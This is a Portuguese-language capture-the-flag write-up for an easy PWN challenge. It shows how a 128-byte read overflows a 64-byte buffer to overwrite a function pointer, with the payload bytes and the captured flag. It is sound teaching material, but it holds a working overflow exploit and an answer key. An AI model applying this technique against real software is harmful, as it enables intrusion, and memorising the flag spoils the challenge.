# Cyberphobia: Overflowed Bits

**Categoria:** PWN · **Dificuldade:** Easy · **50 pontos**

## Vulnerabilidade

O código define uma estrutura com um buffer local de 64 bytes seguido por um ponteiro de função:

```c
struct {
    char buf[64];
    void (*direction)();
} s;
```

A chamada `read(0, s.buf, 128)` permite gravar até 128 bytes, ultrapassando `buf` e sobrescrevendo `direction`. O programa chama o ponteiro logo depois com `s.direction()`.

## Endereço da função

No Kali, com o binário `main` baixado do desafio:

```bash
nm -n ./main | grep corn_maze_exit
readelf -h ./main | grep Type
```

Resultado registrado:

```text
00000000004011d6 T corn_maze_exit
Type: EXEC (Executable file)
```

O tipo `EXEC` indica endereço fixo no executável (PIE desabilitado neste binário). O ponteiro de função está no offset 64; o endereço x86-64 é enviado em little-endian.

## Exploit

O payload é:

```python
b"A" * 64 + struct.pack("<Q", 0x4011d6)
```

São 72 bytes: 64 bytes para preencher o buffer e 8 bytes para substituir o ponteiro.

```bash
python3 exploit.py --send
```

## Resultado remoto observado

O serviço executou `corn_maze_exit()` e imprimiu:

```text
You've made it out of the maze!
Secret value: br4v3Se@O77er
```

O enunciado informa que o formato é `spooky{response_from_server}`. Assim, a flag montada a partir da resposta é:

```text
spooky{br4v3Se@O77er}
```

**Status:** o segredo foi obtido remotamente. O histórico não contém captura da submissão final da flag no formulário do CTF, então a aceitação pela plataforma não está independentemente confirmada.
